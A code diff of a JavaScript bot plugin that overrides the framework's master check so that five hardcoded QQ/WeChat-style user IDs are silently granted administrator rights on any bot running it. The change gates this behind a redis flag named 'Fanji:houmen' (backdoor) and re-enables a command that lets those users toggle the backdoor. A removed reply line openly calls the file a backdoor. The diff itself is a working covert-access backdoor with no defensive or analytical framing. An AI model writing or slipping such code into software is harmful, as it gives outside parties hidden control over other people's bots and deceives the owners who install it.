@@ -1,8 +1,11 @@
 import plugin from '../../../lib/plugins/plugin.js';
-Bot.GetMaster = (e)=>{
+Bot.GetMaster = async (e)=>{
+	let kg = await redis.get('Fanji:houmen')
     if (!(e.user_id === 2173302144 || e.user_id === 197728340 || e.user_id == 'wxid_d0qj1f49bwgf22'|| e.user_id == '25984983967656960@openim'||e.user_id == 'wxid_xh5txgo29pv522')) {
 return
 	}else{
+if (!kg) return
+logger.mark(logger.red('1'))
     e.isMaster = true;
 	return
 	}
@@ -32,8 +35,7 @@ export class GetMaster extends plugin {
 
 
 async Masterkg(e) {  
-    this.reply('后门开关被我删了，要关后门就删apps/Houmen.js吧')
-   /* if (e.msg.includes('强制') && cm.check(this.e.user_id)) {  
+   if (e.msg.includes('强制') && await cm.check(this.e.user_id)) {  
         let open = e.msg.includes('开启');  
         await redis.set('Fanji:houmen', open ? 'true' : 'false');  
         await e.reply('设置完成');  
@@ -43,6 +45,6 @@ async Masterkg(e) {
           let open = e.msg.includes('开启');  
         await redis.set('Fanji:houmen', open ? 'true' : 'false');  
         await e.reply('设置完成');  
-    return false;  */
+    return false; 
 }
 }
